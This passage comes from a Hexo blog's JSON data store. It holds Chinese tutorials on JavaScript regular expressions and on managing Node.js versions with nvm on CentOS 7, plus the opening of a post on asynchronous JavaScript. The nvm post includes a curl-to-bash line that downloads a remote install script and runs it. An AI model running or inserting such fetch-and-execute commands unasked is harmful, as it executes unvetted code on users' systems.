| 检索字符串中指定的值。返回找到的值，并确定其位置|\n| test\t  | 检索字符串中指定的值。返回 true 或 false|\n\n#### <a>8、支持正则表达式的 String 对象的方法</a>\n\n| 方法  | 描述  |\n| - | - |\n| search\t  | 检索与正则表达式相匹配的值|\n| match\t    | 找到一个或多个正则表达式的匹配|\n| replace\t  | 替换与正则表达式匹配的子串|\n| split\t    | 把字符串分割为字符串数组|\n\n","slug":"0809026_JavaScript正则表达式","published":1,"updated":"2018-03-27T03:32:14.924Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvvt002cs4c04sxzw23m","content":"<p>&emsp;正则表达式（英语：<code>Regular Expression</code>，在代码中常简写为 <code>regex</code>、<code>regexp</code> 或 <code>RE</code>）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。<br>&emsp;搜索模式可用于文本搜索和文本替换。</p>\n<h4 id=\"1、什么是正则表达式\"><a href=\"#1、什么是正则表达式\" class=\"headerlink\" title=\"1、什么是正则表达式\"></a><a>1、什么是正则表达式</a></h4><ul>\n<li><p>正则表达式是由一个字符序列形成的搜索模式；</p>\n</li>\n<li><p>当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容；</p>\n</li>\n<li><p>正则表达式可以是一个简单的字符，或一个更复杂的模式；</p>\n</li>\n<li><p>正则表达式可用于所有文本搜索和文本替换的操作。</p>\n</li>\n</ul>\n<h4 id=\"2、语法\"><a href=\"#2、语法\" class=\"headerlink\" title=\"2、语法\"></a><a>2、语法</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> patt=<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(pattern,modifiers);</span><br><span class=\"line\"><span class=\"comment\">// 或者更简单的方式:</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> patt=<span class=\"regexp\">/pattern/m</span>odifiers;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>pattern</code>（模式） 描述了表达式的模式；</li>\n<li><code>modifiers</code>（修饰符） 用于指定全局匹配、区分大小写的匹配和多行匹配。<ul>\n<li>注意：当使用构造函数创造正则对象时，需要常规的字符转义规则（在前面加反斜杠 <code>\\</code>）。比如，以下是等价的：<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> reg = <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">\"\\\\w+\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> reg = <span class=\"regexp\">/\\w+/</span>;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"3、修饰符\"><a href=\"#3、修饰符\" class=\"headerlink\" title=\"3、修饰符\"></a><a>3、修饰符</a></h4><p>  <strong><code>修饰符用于执行区分大小写和全局匹配：</code></strong></p>\n<table>\n<thead>\n<tr>\n<th>修饰符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>i</td>\n<td>执行对大小写不敏感的匹配</td>\n</tr>\n<tr>\n<td>g</td>\n<td>执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）</td>\n</tr>\n<tr>\n<td>m</td>\n<td>执行多行匹配</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"4、方括号\"><a href=\"#4、方括号\" class=\"headerlink\" title=\"4、方括号\"></a><a>4、方括号</a></h4><p>  <strong><code>方括号用于查找某个范围内的字符：</code></strong></p>\n<table>\n<thead>\n<tr>\n<th>表达式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[abc]</td>\n<td>查找方括号之间的任何字符</td>\n</tr>\n<tr>\n<td>[^abc]</td>\n<td>查找任何不在方括号之间的字符</td>\n</tr>\n<tr>\n<td>[0-9]</td>\n<td>查找任何从 0 至 9 的数字</td>\n</tr>\n<tr>\n<td>[a-z]</td>\n<td>查找任何从小写 a 到小写 z 的字符</td>\n</tr>\n<tr>\n<td>[A-Z]</td>\n<td>查找任何从大写 A 到大写 Z 的字符</td>\n</tr>\n<tr>\n<td>[A-z]</td>\n<td>查找任何从大写 A 到小写 z 的字符</td>\n</tr>\n<tr>\n<td>[adgk]</td>\n<td>查找给定集合内的任何字符</td>\n</tr>\n<tr>\n<td>[^adgk]</td>\n<td>查找给定集合外的任何字符</td>\n</tr>\n<tr>\n<td>(red丨blue丨green)</td>\n<td>查找任何指定的选项</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"5、元字符\"><a href=\"#5、元字符\" class=\"headerlink\" title=\"5、元字符\"></a><a>5、元字符</a></h4><p>  <strong><code>元字符（Metacharacter）是拥有特殊含义的字符：</code></strong></p>\n<table>\n<thead>\n<tr>\n<th>元字符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>.</td>\n<td>查找单个字符，除了换行和行结束符</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>查找单词字符</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>查找非单词字符</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>查找数字</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>查找非数字字符</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>查找空白字符</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>查找非空白字符</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>匹配单词边界</td>\n</tr>\n<tr>\n<td>\\B</td>\n<td>匹配非单词边界</td>\n</tr>\n<tr>\n<td>\\0</td>\n<td>查找 NULL 字符</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>查找换行符</td>\n</tr>\n<tr>\n<td>\\f</td>\n<td>查找换页符</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>查找回车符</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>查找制表符</td>\n</tr>\n<tr>\n<td>\\v</td>\n<td>查找垂直制表符</td>\n</tr>\n<tr>\n<td>\\xxx</td>\n<td>查找以八进制数 xxx 规定的字符</td>\n</tr>\n<tr>\n<td>\\xdd</td>\n<td>查找以十六进制数 dd 规定的字符</td>\n</tr>\n<tr>\n<td>\\uxxxx</td>\n<td>查找以十六进制数 xxxx 规定的 Unicode 字符</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、量词\"><a href=\"#6、量词\" class=\"headerlink\" title=\"6、量词\"></a><a>6、量词</a></h4><table>\n<thead>\n<tr>\n<th>量词</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>n+</td>\n<td>匹配任何包含至少一个 n 的字符串。<br>例如，/a+/ 匹配 “candy” 中的 “a”，”caaaaaaandy” 中所有的 “a”。</td>\n</tr>\n<tr>\n<td>n*</td>\n<td>匹配任何包含零个或多个 n 的字符串。<br>例如，/bo*/ 匹配 “A ghost booooed” 中的 “boooo”，”A bird warbled” 中的 “b”，但是不匹配 “A goat grunted”。</td>\n</tr>\n<tr>\n<td>n?</td>\n<td>匹配任何包含零个或一个 n 的字符串。<br>例如，/e?le?/ 匹配 “angel” 中的 “el”，”angle” 中的 “le”。</td>\n</tr>\n<tr>\n<td>n{X}</td>\n<td>匹配包含 X 个 n 的序列的字符串。<br>例如，/a{2}/ 不匹配 “candy,” 中的 “a”，但是匹配 “caandy,” 中的两个 “a”，且匹配 “caaandy.” 中的前两个 “a”。</td>\n</tr>\n<tr>\n<td>n{X, }</td>\n<td>X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。<br>例如，/a{2,}/ 不匹配 “candy” 中的 “a”，但是匹配 “caandy” 和 “caaaaaaandy.” 中所有的 “a”。</td>\n</tr>\n<tr>\n<td>n{X, Y}</td>\n<td>X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。<br>例如，/a{1,3}/ 不匹配 “cndy”，匹配 “candy,” 中的 “a”，”caandy,” 中的两个 “a”，<br>匹配 “caaaaaaandy” 中的前面三个 “a”。注意，当匹配 “caaaaaaandy” 时，即使原始字符串拥有更多的 “a”，匹配项也是 “aaa”。</td>\n</tr>\n<tr>\n<td>n$</td>\n<td>匹配任何结尾为 n 的字符串。</td>\n</tr>\n<tr>\n<td>^n</td>\n<td>匹配任何开头为 n 的字符串。</td>\n</tr>\n<tr>\n<td>?=n</td>\n<td>匹配任何其后紧接指定字符串 n 的字符串。</td>\n</tr>\n<tr>\n<td>?!n</td>\n<td>匹配任何其后没有紧接指定字符串 n 的字符串。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"7、RegExp-对象方法\"><a href=\"#7、RegExp-对象方法\" class=\"headerlink\" title=\"7、RegExp 对象方法\"></a><a>7、RegExp 对象方法</a></h4><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>compile</td>\n<td>编译正则表达式</td>\n</tr>\n<tr>\n<td>exec</td>\n<td>检索字符串中指定的值。返回找到的值，并确定其位置</td>\n</tr>\n<tr>\n<td>test</td>\n<td>检索字符串中指定的值。返回 true 或 false</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"8、支持正则表达式的-String-对象的方法\"><a href=\"#8、支持正则表达式的-String-对象的方法\" class=\"headerlink\" title=\"8、支持正则表达式的 String 对象的方法\"></a><a>8、支持正则表达式的 String 对象的方法</a></h4><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>search</td>\n<td>检索与正则表达式相匹配的值</td>\n</tr>\n<tr>\n<td>match</td>\n<td>找到一个或多个正则表达式的匹配</td>\n</tr>\n<tr>\n<td>replace</td>\n<td>替换与正则表达式匹配的子串</td>\n</tr>\n<tr>\n<td>split</td>\n<td>把字符串分割为字符串数组</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<p>&emsp;正则表达式（英语：<code>Regular Expression</code>，在代码中常简写为 <code>regex</code>、<code>regexp</code> 或 <code>RE</code>）使用单个字符串来描述、匹配一系列符合某个句法规则的字符串搜索模式。<br>&emsp;搜索模式可用于文本搜索和文本替换。</p>\n<h4 id=\"1、什么是正则表达式\"><a href=\"#1、什么是正则表达式\" class=\"headerlink\" title=\"1、什么是正则表达式\"></a><a>1、什么是正则表达式</a></h4><ul>\n<li><p>正则表达式是由一个字符序列形成的搜索模式；</p>\n</li>\n<li><p>当你在文本中搜索数据时，你可以用搜索模式来描述你要查询的内容；</p>\n</li>\n<li><p>正则表达式可以是一个简单的字符，或一个更复杂的模式；</p>\n</li>\n<li><p>正则表达式可用于所有文本搜索和文本替换的操作。</p>\n</li>\n</ul>\n<h4 id=\"2、语法\"><a href=\"#2、语法\" class=\"headerlink\" title=\"2、语法\"></a><a>2、语法</a></h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> patt=<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(pattern,modifiers);</span><br><span class=\"line\"><span class=\"comment\">// 或者更简单的方式:</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> patt=<span class=\"regexp\">/pattern/m</span>odifiers;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>pattern</code>（模式） 描述了表达式的模式；</li>\n<li><code>modifiers</code>（修饰符） 用于指定全局匹配、区分大小写的匹配和多行匹配。<ul>\n<li>注意：当使用构造函数创造正则对象时，需要常规的字符转义规则（在前面加反斜杠 <code>\\</code>）。比如，以下是等价的：<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> reg = <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">\"\\\\w+\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> reg = <span class=\"regexp\">/\\w+/</span>;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"3、修饰符\"><a href=\"#3、修饰符\" class=\"headerlink\" title=\"3、修饰符\"></a><a>3、修饰符</a></h4><p>  <strong><code>修饰符用于执行区分大小写和全局匹配：</code></strong></p>\n<table>\n<thead>\n<tr>\n<th>修饰符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>i</td>\n<td>执行对大小写不敏感的匹配</td>\n</tr>\n<tr>\n<td>g</td>\n<td>执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）</td>\n</tr>\n<tr>\n<td>m</td>\n<td>执行多行匹配</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"4、方括号\"><a href=\"#4、方括号\" class=\"headerlink\" title=\"4、方括号\"></a><a>4、方括号</a></h4><p>  <strong><code>方括号用于查找某个范围内的字符：</code></strong></p>\n<table>\n<thead>\n<tr>\n<th>表达式</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[abc]</td>\n<td>查找方括号之间的任何字符</td>\n</tr>\n<tr>\n<td>[^abc]</td>\n<td>查找任何不在方括号之间的字符</td>\n</tr>\n<tr>\n<td>[0-9]</td>\n<td>查找任何从 0 至 9 的数字</td>\n</tr>\n<tr>\n<td>[a-z]</td>\n<td>查找任何从小写 a 到小写 z 的字符</td>\n</tr>\n<tr>\n<td>[A-Z]</td>\n<td>查找任何从大写 A 到大写 Z 的字符</td>\n</tr>\n<tr>\n<td>[A-z]</td>\n<td>查找任何从大写 A 到小写 z 的字符</td>\n</tr>\n<tr>\n<td>[adgk]</td>\n<td>查找给定集合内的任何字符</td>\n</tr>\n<tr>\n<td>[^adgk]</td>\n<td>查找给定集合外的任何字符</td>\n</tr>\n<tr>\n<td>(red丨blue丨green)</td>\n<td>查找任何指定的选项</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"5、元字符\"><a href=\"#5、元字符\" class=\"headerlink\" title=\"5、元字符\"></a><a>5、元字符</a></h4><p>  <strong><code>元字符（Metacharacter）是拥有特殊含义的字符：</code></strong></p>\n<table>\n<thead>\n<tr>\n<th>元字符</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>.</td>\n<td>查找单个字符，除了换行和行结束符</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>查找单词字符</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>查找非单词字符</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>查找数字</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>查找非数字字符</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>查找空白字符</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>查找非空白字符</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>匹配单词边界</td>\n</tr>\n<tr>\n<td>\\B</td>\n<td>匹配非单词边界</td>\n</tr>\n<tr>\n<td>\\0</td>\n<td>查找 NULL 字符</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>查找换行符</td>\n</tr>\n<tr>\n<td>\\f</td>\n<td>查找换页符</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>查找回车符</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>查找制表符</td>\n</tr>\n<tr>\n<td>\\v</td>\n<td>查找垂直制表符</td>\n</tr>\n<tr>\n<td>\\xxx</td>\n<td>查找以八进制数 xxx 规定的字符</td>\n</tr>\n<tr>\n<td>\\xdd</td>\n<td>查找以十六进制数 dd 规定的字符</td>\n</tr>\n<tr>\n<td>\\uxxxx</td>\n<td>查找以十六进制数 xxxx 规定的 Unicode 字符</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、量词\"><a href=\"#6、量词\" class=\"headerlink\" title=\"6、量词\"></a><a>6、量词</a></h4><table>\n<thead>\n<tr>\n<th>量词</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>n+</td>\n<td>匹配任何包含至少一个 n 的字符串。<br>例如，/a+/ 匹配 “candy” 中的 “a”，”caaaaaaandy” 中所有的 “a”。</td>\n</tr>\n<tr>\n<td>n*</td>\n<td>匹配任何包含零个或多个 n 的字符串。<br>例如，/bo*/ 匹配 “A ghost booooed” 中的 “boooo”，”A bird warbled” 中的 “b”，但是不匹配 “A goat grunted”。</td>\n</tr>\n<tr>\n<td>n?</td>\n<td>匹配任何包含零个或一个 n 的字符串。<br>例如，/e?le?/ 匹配 “angel” 中的 “el”，”angle” 中的 “le”。</td>\n</tr>\n<tr>\n<td>n{X}</td>\n<td>匹配包含 X 个 n 的序列的字符串。<br>例如，/a{2}/ 不匹配 “candy,” 中的 “a”，但是匹配 “caandy,” 中的两个 “a”，且匹配 “caaandy.” 中的前两个 “a”。</td>\n</tr>\n<tr>\n<td>n{X, }</td>\n<td>X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。<br>例如，/a{2,}/ 不匹配 “candy” 中的 “a”，但是匹配 “caandy” 和 “caaaaaaandy.” 中所有的 “a”。</td>\n</tr>\n<tr>\n<td>n{X, Y}</td>\n<td>X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。<br>例如，/a{1,3}/ 不匹配 “cndy”，匹配 “candy,” 中的 “a”，”caandy,” 中的两个 “a”，<br>匹配 “caaaaaaandy” 中的前面三个 “a”。注意，当匹配 “caaaaaaandy” 时，即使原始字符串拥有更多的 “a”，匹配项也是 “aaa”。</td>\n</tr>\n<tr>\n<td>n$</td>\n<td>匹配任何结尾为 n 的字符串。</td>\n</tr>\n<tr>\n<td>^n</td>\n<td>匹配任何开头为 n 的字符串。</td>\n</tr>\n<tr>\n<td>?=n</td>\n<td>匹配任何其后紧接指定字符串 n 的字符串。</td>\n</tr>\n<tr>\n<td>?!n</td>\n<td>匹配任何其后没有紧接指定字符串 n 的字符串。</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"7、RegExp-对象方法\"><a href=\"#7、RegExp-对象方法\" class=\"headerlink\" title=\"7、RegExp 对象方法\"></a><a>7、RegExp 对象方法</a></h4><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>compile</td>\n<td>编译正则表达式</td>\n</tr>\n<tr>\n<td>exec</td>\n<td>检索字符串中指定的值。返回找到的值，并确定其位置</td>\n</tr>\n<tr>\n<td>test</td>\n<td>检索字符串中指定的值。返回 true 或 false</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"8、支持正则表达式的-String-对象的方法\"><a href=\"#8、支持正则表达式的-String-对象的方法\" class=\"headerlink\" title=\"8、支持正则表达式的 String 对象的方法\"></a><a>8、支持正则表达式的 String 对象的方法</a></h4><table>\n<thead>\n<tr>\n<th>方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>search</td>\n<td>检索与正则表达式相匹配的值</td>\n</tr>\n<tr>\n<td>match</td>\n<td>找到一个或多个正则表达式的匹配</td>\n</tr>\n<tr>\n<td>replace</td>\n<td>替换与正则表达式匹配的子串</td>\n</tr>\n<tr>\n<td>split</td>\n<td>把字符串分割为字符串数组</td>\n</tr>\n</tbody>\n</table>\n"},{"id":"0809029","title":"CentOS 7上使用nvm管理Node版本","date":"2018-01-10T03:15:22.000Z","_content":"\n> NVM（Node version manager）顾名思义，就是Node.js的版本管理软件，可以轻松的在Node.js各个版本间切换，项目源码GitHub\n\n1. 下载并安装NVM脚本\n```sh\n# 下载安装\n$ curl https://raw.githubusercontent.com/creationix/nvm/v0.13.1/install.sh | bash\n\n# 重新 source 一下环境变量\n$ source ~/.bash_profile\n```\n\n2. 查看版本号\n```sh\n# 查看远程所有的 `Node` 版本\n$ nvm ls-remote\n\n# 查看当前系统 node 版本\n$ nvm ls\n\n$ nvm ls\n->       v8.9.4\n         system\ndefault -> v8.9.4\nnode -> stable (-> v8.9.4) (default)\nstable -> 8.9 (-> v8.9.4) (default)\niojs -> N/A (default)\nlts/* -> lts/carbon (-> N/A)\nlts/argon -> v4.8.7 (-> N/A)\nlts/boron -> v6.13.1 (-> N/A)\nlts/carbon -> v8.10.0 (-> N/A)\n```\n\n3. 安装所需的版本\n```sh\n$ nvm install v8.9.4\n```\n\n4. 切换版本\n```sh\n$ nvm use v8.10.0\n```\n\n5. 设置默认版本\n```sh\n$ nvm alias default v8.9.4\n```","source":"_posts/0809029_CentOS-7上使用nvm管理Node版本.md","raw":"---\nid: 0809029\ntitle: CentOS 7上使用nvm管理Node版本\ndate: 2018-01-10 11:15:22\ntags:\n  - Node.js\n  - nvm\ncategories:\n---\n\n> NVM（Node version manager）顾名思义，就是Node.js的版本管理软件，可以轻松的在Node.js各个版本间切换，项目源码GitHub\n\n1. 下载并安装NVM脚本\n```sh\n# 下载安装\n$ curl https://raw.githubusercontent.com/creationix/nvm/v0.13.1/install.sh | bash\n\n# 重新 source 一下环境变量\n$ source ~/.bash_profile\n```\n\n2. 查看版本号\n```sh\n# 查看远程所有的 `Node` 版本\n$ nvm ls-remote\n\n# 查看当前系统 node 版本\n$ nvm ls\n\n$ nvm ls\n->       v8.9.4\n         system\ndefault -> v8.9.4\nnode -> stable (-> v8.9.4) (default)\nstable -> 8.9 (-> v8.9.4) (default)\niojs -> N/A (default)\nlts/* -> lts/carbon (-> N/A)\nlts/argon -> v4.8.7 (-> N/A)\nlts/boron -> v6.13.1 (-> N/A)\nlts/carbon -> v8.10.0 (-> N/A)\n```\n\n3. 安装所需的版本\n```sh\n$ nvm install v8.9.4\n```\n\n4. 切换版本\n```sh\n$ nvm use v8.10.0\n```\n\n5. 设置默认版本\n```sh\n$ nvm alias default v8.9.4\n```","slug":"0809029_CentOS-7上使用nvm管理Node版本","published":1,"updated":"2018-03-26T12:22:41.439Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvvw002es4c06cp53rj5","content":"<blockquote>\n<p>NVM（Node version manager）顾名思义，就是Node.js的版本管理软件，可以轻松的在Node.js各个版本间切换，项目源码GitHub</p>\n</blockquote>\n<ol>\n<li><p>下载并安装NVM脚本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载安装</span></span><br><span class=\"line\">$ curl https://raw.githubusercontent.com/creationix/nvm/v0.13.1/install.sh | bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 重新 source 一下环境变量</span></span><br><span class=\"line\">$ <span class=\"built_in\">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看版本号</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看远程所有的 `Node` 版本</span></span><br><span class=\"line\">$ nvm ls-remote</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看当前系统 node 版本</span></span><br><span class=\"line\">$ nvm ls</span><br><span class=\"line\"></span><br><span class=\"line\">$ nvm ls</span><br><span class=\"line\">-&gt;       v8.9.4</span><br><span class=\"line\">         system</span><br><span class=\"line\">default -&gt; v8.9.4</span><br><span class=\"line\">node -&gt; stable (-&gt; v8.9.4) (default)</span><br><span class=\"line\">stable -&gt; 8.9 (-&gt; v8.9.4) (default)</span><br><span class=\"line\">iojs -&gt; N/A (default)</span><br><span class=\"line\">lts/* -&gt; lts/carbon (-&gt; N/A)</span><br><span class=\"line\">lts/argon -&gt; v4.8.7 (-&gt; N/A)</span><br><span class=\"line\">lts/boron -&gt; v6.13.1 (-&gt; N/A)</span><br><span class=\"line\">lts/carbon -&gt; v8.10.0 (-&gt; N/A)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装所需的版本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nvm install v8.9.4</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>切换版本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nvm use v8.10.0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置默认版本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nvm <span class=\"built_in\">alias</span> default v8.9.4</span><br></pre></td></tr></table></figure></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>NVM（Node version manager）顾名思义，就是Node.js的版本管理软件，可以轻松的在Node.js各个版本间切换，项目源码GitHub</p>\n</blockquote>\n<ol>\n<li><p>下载并安装NVM脚本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载安装</span></span><br><span class=\"line\">$ curl https://raw.githubusercontent.com/creationix/nvm/v0.13.1/install.sh | bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 重新 source 一下环境变量</span></span><br><span class=\"line\">$ <span class=\"built_in\">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>查看版本号</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看远程所有的 `Node` 版本</span></span><br><span class=\"line\">$ nvm ls-remote</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看当前系统 node 版本</span></span><br><span class=\"line\">$ nvm ls</span><br><span class=\"line\"></span><br><span class=\"line\">$ nvm ls</span><br><span class=\"line\">-&gt;       v8.9.4</span><br><span class=\"line\">         system</span><br><span class=\"line\">default -&gt; v8.9.4</span><br><span class=\"line\">node -&gt; stable (-&gt; v8.9.4) (default)</span><br><span class=\"line\">stable -&gt; 8.9 (-&gt; v8.9.4) (default)</span><br><span class=\"line\">iojs -&gt; N/A (default)</span><br><span class=\"line\">lts/* -&gt; lts/carbon (-&gt; N/A)</span><br><span class=\"line\">lts/argon -&gt; v4.8.7 (-&gt; N/A)</span><br><span class=\"line\">lts/boron -&gt; v6.13.1 (-&gt; N/A)</span><br><span class=\"line\">lts/carbon -&gt; v8.10.0 (-&gt; N/A)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装所需的版本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nvm install v8.9.4</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>切换版本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nvm use v8.10.0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置默认版本</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ nvm <span class=\"built_in\">alias</span> default v8.9.4</span><br></pre></td></tr></table></figure></li>\n</ol>\n"},{"id":"0808024","title":"JavaScript 异步编程","date":"2017-12-26T03:48:34.000Z","_content":"\n> 对于`JavaScript` ，什么是异步编程？为什么要异步？如何做？\n\n- 由于JavaScript的执行环境是 `单线程` 的。即一次只能完成一件任务，如果有多个任务，就必须排队，前面一个任务完成，再执行后面一个任务，以此类推。\n\n- 这种模式的好处是实现起来比较简单，执行环境相对单纯；坏处是只要有一个任务耗时很长，后面的任务都必须排队等着，会拖延整个程序的执行。常见的浏览器无响应（假死），往往就是因为某一段Javascript代码长时间运行（比如死循环），导致整个页面卡在这个地方，其他任务无法执行。\n\n- 为了解决这个问题，Javascript语言将任务的执行模式分成两种：同步（Synchronous）和异步（Asynchronous）。\n\n- \"同步模式\"就是上一段的模式，后一个任务等待前一个任务结束，然后再执行，程序的执行顺序与任务的排列顺序是一致的、同步的；\"异步模式\"则完全不同，每一个任务有一个或多个回 调函数（callback），前一个任务结束后，不是执行后一个任务，而是执行回调函数，后一个任务则是不等前一个任务结束就执行，所以程序的执行顺序与任务的排列顺序是不一致的、异 